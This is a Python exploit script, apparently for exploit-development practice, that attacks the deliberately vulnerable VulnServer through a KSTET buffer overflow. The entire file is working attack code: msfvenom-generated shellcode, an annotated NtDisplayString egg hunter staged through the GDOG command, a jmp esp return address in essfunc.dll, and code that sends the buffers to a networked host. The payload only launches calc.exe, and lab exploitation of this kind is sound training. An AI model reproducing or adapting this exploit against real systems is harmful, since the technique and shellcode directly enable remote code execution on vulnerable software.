#!/usr/share/python

import struct
import time
import socket
from pwn import *

def EggHunter():

	#root@kali:~# msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python -v shellcode (220 bytes)
	shellcode =  ""
	shellcode += "\xbf\xc6\xde\x94\x3e\xda\xd0\xd9\x74\x24\xf4\x5d"
	shellcode += "\x31\xc9\xb1\x31\x31\x7d\x13\x03\x7d\x13\x83\xc5"
	shellcode += "\xc2\x3c\x61\xc2\x22\x42\x8a\x3b\xb2\x23\x02\xde"
	shellcode += "\x83\x63\x70\xaa\xb3\x53\xf2\xfe\x3f\x1f\x56\xeb"
	shellcode += "\xb4\x6d\x7f\x1c\x7d\xdb\x59\x13\x7e\x70\x99\x32"
	shellcode += "\xfc\x8b\xce\x94\x3d\x44\x03\xd4\x7a\xb9\xee\x84"
	shellcode += "\xd3\xb5\x5d\x39\x50\x83\x5d\xb2\x2a\x05\xe6\x27"
	shellcode += "\xfa\x24\xc7\xf9\x71\x7f\xc7\xf8\x56\x0b\x4e\xe3"
	shellcode += "\xbb\x36\x18\x98\x0f\xcc\x9b\x48\x5e\x2d\x37\xb5"
	shellcode += "\x6f\xdc\x49\xf1\x57\x3f\x3c\x0b\xa4\xc2\x47\xc8"
	shellcode += "\xd7\x18\xcd\xcb\x7f\xea\x75\x30\x7e\x3f\xe3\xb3"
	shellcode += "\x8c\xf4\x67\x9b\x90\x0b\xab\x97\xac\x80\x4a\x78"
	shellcode += "\x25\xd2\x68\x5c\x6e\x80\x11\xc5\xca\x67\x2d\x15"
	shellcode += "\xb5\xd8\x8b\x5d\x5b\x0c\xa6\x3f\x31\xd3\x34\x3a"
	shellcode += "\x77\xd3\x46\x45\x27\xbc\x77\xce\xa8\xbb\x87\x05"
	shellcode += "\x8d\x34\xc2\x04\xa7\xdc\x8b\xdc\xfa\x80\x2b\x0b"
	shellcode += "\x38\xbd\xaf\xbe\xc0\x3a\xaf\xca\xc5\x07\x77\x26"
	shellcode += "\xb7\x18\x12\x48\x64\x18\x37\x2b\xeb\x8a\xdb\x82"
	shellcode += "\x8e\x2a\x79\xdb"

	# egg hunter code using NtDisplayString syscall (32 bytes)
	egghunter  = "\x66\x81\xCA\xFF\x0F"  # or dx,0x0fff      # loop thru memory pages
	egghunter += "\x42"                  # inc edx by 1      # loop thru addresses for given page
	egghunter += "\x52"                  # push edx          # save EDX in stack before syscall
	egghunter += "\x6A\x43"              # push byte +0x43   # push 0x43 (syscall id for NtDisplayString) onto the stack
	egghunter += "\x58"                  # pop eax           # store it in EAX
	egghunter += "\xCD\x2E"              # int 0x2e          # make syscall
	egghunter += "\x3C\x05"              # cmp al,0x5        # compare lower portion of EAX with 5 to check for access violations
	egghunter += "\x5A"                  # pop edx           # restore EDX after syscal was made
	egghunter += "\x74\xEF"              # jz 0x0            # if true go back to first instruction and check the next memory page
	egghunter += "\xB8\x77\x30\x30\x74"  # mov eax,w00t      # else move egg marker value to eax
	egghunter += "\x8B\xFA"              # mov edi,edx       # move pointer to EDI
	egghunter += "\xAF"                  # scasd             # check for egg value match
	egghunter += "\x75\xEA"              # jnz 0x5           # if true jump to increment EDX and check the next memory address in page
	egghunter += "\xAF"                  # scasd             # else increment EDI and check the value again (to make sure it's not egghunter code)
	egghunter += "\x75\xE7"              # jnz 0x5           # if true jump to increment EDX and check the next memory address in page
	egghunter += "\xFF\xE7"              # jmp edi           # else egg marker found! execute shellcode positioned right after 

	eggs = "\x77\x30\x30\x74\x77\x30\x30\x74"                #w00tw00t

	payload  = "GDOG "                                       # valid command
	payload += eggs                                          # egg marker
	payload += shellcode                                     # calc.exe shellcode

	buffer  = "KSTET ."                                      # valid command
	buffer += "\x90" * 10                                    # NOP sled
	buffer += egghunter                                      # egghunter code
	buffer += "\x90" * (69-10-len(egghunter))                # filler 
	buffer += struct.pack('<L', 0x625011F7)                  # jmp esp essfunc.dll
	buffer += "\x89\xE0\x83\xE8\x50\xFF\xE0"                 # mov eax,esp, sub eax, 50, jmp eax (jump code)

	try:
		r = remote('192.168.0.10', 9999)
		r.recv(2048)
		print "[+] Sending %s bytes evil payload.." %len(payload)
		r.send(payload)
		r.recv(2048)
		print "[+] Sending %s bytes evil buffer.." %len(buffer)
		r.send(buffer)
	except:
		print "Couldn't connect to target!"

def main():

	print (
	'''
	+-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+
	|V|u|l|n|S|e|r|v|e|r| |R|e|m|o|t|e| |B|u|f|f|e|r| |O|v|e|r|f|l|o|w|
	+-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+
	'''
    )
	EggHunter()

if __name__ == '__main__':
	main()